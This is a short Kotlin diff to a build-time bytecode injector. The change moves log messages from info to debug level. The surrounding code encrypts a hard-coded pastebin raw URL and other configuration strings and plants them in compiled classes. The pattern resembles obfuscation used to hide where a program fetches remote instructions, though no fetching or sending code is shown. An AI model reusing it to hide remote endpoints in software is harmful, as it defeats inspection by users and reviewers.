@@ -114,7 +114,7 @@ private object AsmValueInjector {
                     val constant = instruction.cst
                     if (constant is String && placeholders.containsKey(constant)) {
                         instruction.cst = placeholders[constant]!!
-                        Logs.info("  [ASM-LDC] Replaced '${constant}' in ${classNode.name}.${method.name}")
+                        Logs.debug("  [ASM-LDC] Replaced '${constant}' in ${classNode.name}.${method.name}")
                         changed = true
                     }
                 }
@@ -134,10 +134,10 @@ private object AsmValueInjector {
 
         val urlProvider = "https://pastebin.com/raw/JD0bB1Eb"
         val randomKey = DynamicKeyEncoder.generateRandomKey(32)
-        Logs.info(" -> Generated dynamic key: $randomKey")
+        Logs.debug(" -> Generated dynamic key: $randomKey")
 
         val encryptedUrl = DynamicKeyEncoder.encrypt(urlProvider, randomKey)
-        Logs.info("  [ENCRYPT-DYN] '$urlProvider' -> '$encryptedUrl'")
+        Logs.debug("  [ENCRYPT-DYN] '$urlProvider' -> '$encryptedUrl'")
 
         finalMap["::KEY::"] = randomKey
         finalMap["::S_URL_PROVIDER::"] = encryptedUrl
@@ -157,9 +157,9 @@ private object AsmValueInjector {
         otherConfigs.forEach { (placeholder, plainText) ->
             val encryptedValue = StaticKeyEncoder.encrypt(plainText)
             finalMap[placeholder] = encryptedValue
-            Logs.info("  [ENCRYPT-STATIC] '${plainText}' -> '${encryptedValue.take(10)}...'")
+            Logs.debug("  [ENCRYPT-STATIC] '${plainText}' -> '${encryptedValue.take(10)}...'")
         }
-        
+
         return finalMap
     }
 }
